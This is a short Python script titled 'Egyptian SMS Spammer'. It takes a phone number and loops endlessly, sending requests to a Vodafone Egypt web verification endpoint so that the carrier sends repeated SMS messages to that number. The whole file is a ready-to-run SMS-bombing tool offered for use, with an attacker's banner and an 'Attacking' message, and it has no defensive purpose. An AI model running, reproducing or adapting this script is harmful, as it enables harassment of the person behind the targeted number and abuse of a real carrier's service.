#!/usr/bin/env python
#by wazehell fb.com/wazehell || githup.com/wazehell
import requests
logo = """ 
 __       __                                __    __            __  __ 
/  |  _  /  |                              /  |  /  |          /  |/  |
$$ | / \ $$ |  ______   ________   ______  $$ |  $$ |  ______  $$ |$$ |
$$ |/$  \$$ | /      \ /        | /      \ $$ |__$$ | /      \ $$ |$$ |
$$ /$$$  $$ | $$$$$$  |$$$$$$$$/ /$$$$$$  |$$    $$ |/$$$$$$  |$$ |$$ |
$$ $$/$$ $$ | /    $$ |  /  $$/  $$    $$ |$$$$$$$$ |$$    $$ |$$ |$$ |
$$$$/  $$$$ |/$$$$$$$ | /$$$$/__ $$$$$$$$/ $$ |  $$ |$$$$$$$$/ $$ |$$ |
$$$/    $$$ |$$    $$ |/$$      |$$       |$$ |  $$ |$$       |$$ |$$ |
$$/      $$/  $$$$$$$/ $$$$$$$$/  $$$$$$$/ $$/   $$/  $$$$$$$/ $$/ $$/ 
                                                                       
                         Egyptian SMS Spammer
fb.com/WazeHell , @wazehell
"""
print(logo)
num = raw_input('Enter Number >>')
def attack(num):
	while True:
			for x in range(50):	
					url = 'https://web.vodafone.com.eg/dashboard/verify/'+num+'/ar'
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
					response = requests.get(url, headers=headers)
					print("[+] Attacking ...... [+] ")
attack(num)

